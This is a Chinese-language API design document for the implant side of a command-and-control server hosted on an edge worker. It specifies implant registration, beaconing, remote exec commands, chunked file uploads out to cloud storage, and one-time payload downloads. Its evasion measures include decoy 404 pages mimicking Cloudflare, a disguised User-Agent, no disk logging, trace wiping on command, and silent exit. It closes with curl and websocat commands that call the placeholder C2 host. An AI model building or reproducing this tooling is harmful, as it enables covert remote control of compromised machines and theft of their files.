# 03-02 · 植入体侧 API（edge worker）

> 基址：`https://c2.example.com`（部署时自定义）
> 全部端点都**不需要** cookie；认证靠 `payload_psk` 派生的凭据。
> 认证失败一律返回**同一种**错误体（不区分"PSK 不存在"与"HMAC 错误"），避免枚举。

---

## 0. 端点总表

| 方法 | 路径 | 认证 | 用途 |
|---|---|---|---|
| POST | `/v1/register` | `payload_psk` | 建立会话，返回 `sid` + `session_token` + 操作员公钥 |
| GET | `/v1/ws/beacon` | `session_token` | WS 升级（主通道） |
| POST | `/v1/beacon` | `session_token` | 批量上行 + 取下行（兜底） |
| PUT | `/v1/file/:tid/:idx` | `session_token` | 上传分片（→ R2） |
| GET | `/v1/file/:tid/:idx` | `session_token` | 下载分片（← R2） |
| GET | `/d/:token` | 一次性令牌 | 载荷下载 |
| GET | `/health` | 无 | 空 200 |
| ANY | 其它 | — | 诱饵响应 |

---

## 1. `POST /v1/register`

### 请求

```http
POST /v1/register HTTP/1.1
Host: c2.example.com
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ...

{
  "v": 1,
  "psk_id": "CgXk9aQ2",                 // b64u(8B)，载荷里带的 ID
  "ts": 1763000000,                     // unix 秒
  "nc": "9mQ1...",                      // b64u(16B) 客户端 nonce
  "h":  "3sVd...",                      // b64u(32B) HMAC
  "pub":"BAA...",                       // b64u(65B) implant_eph_pub（未压缩 P-256）
  "fp": "9f2c1a7b3d4e5f60"              // SHA256(pub)[:8] hex
}
```

`h = HMAC-SHA256(K_reg, psk_id || "." || ts || "." || nc)`，`K_reg = HKDF-SHA256(payload_psk, info="stc2/v1/reg")`。

### 响应 200

```jsonc
{
  "v": 1,
  "sid": "AAAA...",                 // b64u(16B)
  "tok": "ZZZ...",                  // b64u(32B) session_token
  "srv_ts": 1763000001,
  "op_pub": "BAA...",               // 操作员公钥（植入体要校验指纹）
  "op_fp": "9f2c1a7b3d4e5f60",
  "key_id": "K1...",
  "next": 300,                      // 建议轮询/心跳间隔基线（秒）
  "cfg": {
    "hb": 60,                       // 心跳间隔
    "jitter": 0.2,
    "transport": ["ws", "http"],
    "meta_mode": "plain",
    "max_frame": 1048576,
    "chunk": 4194304
  }
}
```

### 错误

| 状态 | `code` | 说明 |
|---|---|---|
| 400 | `E_FORMAT` | 字段缺失/类型错 |
| 400 | `E_CLOCK_SKEW` | `ts` 漂移 > 300 s |
| 401 | `E_AUTH` | PSK/HMAC 不匹配（不区分原因） |
| 403 | `E_REVOKED` | 载荷已吊销 |
| 429 | `E_RATE` | 注册频率超限（同 IP 5 次/分钟） |

### 服务端做的事（按顺序）

1. 校验格式与 `ts` 窗口；
2. 用 `psk_id` 查 `payloads`（D1 读 1 行；结果缓存进 KV 10 min）；
3. 校验 `h`（恒定时间比较）；
4. 校验 `nc` 未在 24 h 内用过（DO `HubDO` 的 `nonce` 表，或 KV `pn:{psk_id}:{nc}` 短 TTL —— 用 KV 会吃写额度，**默认用 HubDO**）；
5. 生成 `sid`、`tok`；
6. 写 `sessions`（1 行）、`audit_log`（1 行，异步）；
7. 返回。

**预算**：D1 读 1 + 写 1，DO 1 次，CPU ≈ 2 ms。

---

## 2. `GET /v1/ws/beacon`

```http
GET /v1/ws/beacon HTTP/1.1
Host: c2.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Authorization: Bearer ZZZ...
X-STC2-V: 1
X-STC2-Caps: shell,file,screen
```

- 成功：`101 Switching Protocols`，随后发 `hello` 帧。
- 失败：`401`（令牌无效）/`404`（sid 不存在）/`429`。

**为什么用 header 而不是 query**：令牌进 URL 会被 CDN 日志、Referer、浏览器历史留存。这是 VShell 的老问题（`?verify_key=`），不重犯。

**在 URL 里放 sid**：`/v1/ws/beacon?sid=...` 是可选的；不放在 URL 里也行——服务端从 `Authorization` 里解析出的 token 反查 sid（token 里编了 sid）。默认**不**把 sid 放 URL。

---

## 3. `POST /v1/beacon`

单次请求完成"交一批 + 取一批"，用于 WS 不可用时。

```http
POST /v1/beacon HTTP/1.1
Authorization: Bearer ZZZ...
Content-Type: application/json

{
  "v": 1,
  "sid": "AAAA...",
  "up": [
    {"t":"hb","seq":11},
    {"t":"res","seq":12,"n":"...","ct":"...","meta":{"tid":"TTTT","rid":"RRRR","sz":36,"done":true}}
  ],
  "ack": ["TTTT"],
  "want": 8
}
```

```jsonc
// 200
{
  "v": 1,
  "down": [
    {"t":"cmd","seq":5,"n":"...","ct":"...","meta":{"tid":"UUUU","cat":"exec","exp":1763000060}}
  ],
  "next": 300,
  "srv_ts": 1763000012
}
```

规则：

- `up` ≤ 32 帧、总大小 ≤ 256 KB；`down` ≤ `want`（上限 20）且 ≤ 256 KB。
- `ack` 里的 `tid` 会从 DO 的 `pending` 删除（幂等）。
- 服务端在响应头回 `X-STC2-Dup: n`（被丢弃的重复帧数）、`X-STC2-Throttle: 1`（配额吃紧，建议拉长间隔）。

---

## 4. 文件分片

### 上传（implant → R2）

```http
PUT /v1/file/TTTT/0 HTTP/1.1
Authorization: Bearer ZZZ...
Content-Type: application/octet-stream
X-STC2-Total: 3
X-STC2-Size: 4194304
X-STC2-SHA256: 9f2c...

<4 MiB 二进制>
```

响应 `204`。服务端：

1. 校验会话与 `tid` 归属（`files.session_id == sid`）；
2. 流式写入 R2：`{env}/sessions/{sid}/files/{tid}/{idx:05d}`（不 buffer 到内存）；
3. `file_chunks` 插 1 行；`files.chunks_done += 1`（**同一事务里用 `db.batch()`**）；
4. 最后一片到达时校验 `sha256`，置 `complete`。

**设计要点**：分片内容**不加密**（R2 侧由 CF 托管），但**文件名/路径**在 L2 里加密传输——所以服务端只知道"某会话传了一个 N 片的文件"，不知道它是什么文件。若要内容级加密，用 `file` 帧里下发的 `K_file` 在客户端加密后再上传（`X-STC2-Enc: aesgcm`），服务端只存密文——**v1 支持但默认关闭**，原因是要在浏览器端解密大文件，成本高。

### 下载（R2 → implant）

```http
GET /v1/file/TTTT/0 HTTP/1.1
Authorization: Bearer ZZZ...
```

返回 `206 Partial Content`（或 `200`）+ `X-STC2-SHA256`。服务端直接 `R2.get()` 的 `body` 作为响应体（流式，不占内存）。

---

## 5. 载荷下载 `GET /d/:token`

```http
GET /d/eyJ... HTTP/1.1
```

- `token` 是 KV 里的 `dl:{token}` → `{payload_id, r2_key, exp, one_time}`。
- 命中：流式返回 R2 对象，`Content-Disposition: attachment`，`Cache-Control: no-store`。
- `one_time=true`：读取后立即删 KV 键（尽力而为；KV 最终一致，所以真正的"一次性"靠 `exp` 短（10 min）+ 下载计数告警）。
- 未命中：返回**诱饵 404**（与普通静态站点 404 一致，不暴露"这里曾有文件"）。

---

## 6. 诱饵响应（mimicry）

任何未匹配的路径返回一个可配置的"正常站点"响应：

```ts
// 默认：像 Cloudflare 后面的一个静态站
return new Response(DECOY_404_HTML, {
  status: 404,
  headers: {
    'content-type': 'text/html; charset=utf-8',
    'server': 'cloudflare',
    'cache-control': 'public, max-age=300',
  },
});
```

配置项 `EDGE_DECOY`：`cdn`（默认，静态站 404）/ `api`（伪 JSON 404）/ `off`（返回 204）。
**不要**返回 `Server: workerd` 或任何暴露 Worker 的 header。

---

## 7. 客户端实现检查表

- [ ] `register` 失败 401/403 → **停止**（不要无限重试，会把自己打成特征）。
- [ ] `op_fp` 与内置指纹不一致 → 静默退出。
- [ ] `seq` 从 1 开始，持久化到内存（重启后新会话 → 重新从 1）。
- [ ] 心跳用**固定字节串**（走自动应答）。
- [ ] WS 断开后指数退避（5/15/45/120 s，±20% 抖动）。
- [ ] `cmd` 的 `ttl` 过期就丢弃（不执行），并回 `res {ok:false, err:"expired"}`。
- [ ] 结果 > 64 KB 自动落 R2 并只传引用。
- [ ] 所有请求带一个"看起来正常"的 `User-Agent`（可配置）。
- [ ] 不打印任何日志到磁盘（默认）。
- [ ] 收到 `bye{reason:"wipe"}` → 清理落盘痕迹并退出。

---

## 8. 用 curl / websocat 复现（便于联调）

```bash
# 注册（PSK 由控制台生成）
curl -s https://c2.example.com/v1/register \
  -H 'content-type: application/json' \
  -d '{"v":1,"psk_id":"CgXk9aQ2","ts":1763000000,"nc":"...","h":"...","pub":"BAA...","fp":"9f2c1a7b3d4e5f60"}'

# WS 连接
websocat -H "Authorization: Bearer $TOK" wss://c2.example.com/v1/ws/beacon

# 批量轮询
curl -s https://c2.example.com/v1/beacon \
  -H "Authorization: Bearer $TOK" \
  -H 'content-type: application/json' \
  -d '{"v":1,"sid":"...","up":[{"t":"hb","seq":1}],"ack":[],"want":4}'
```
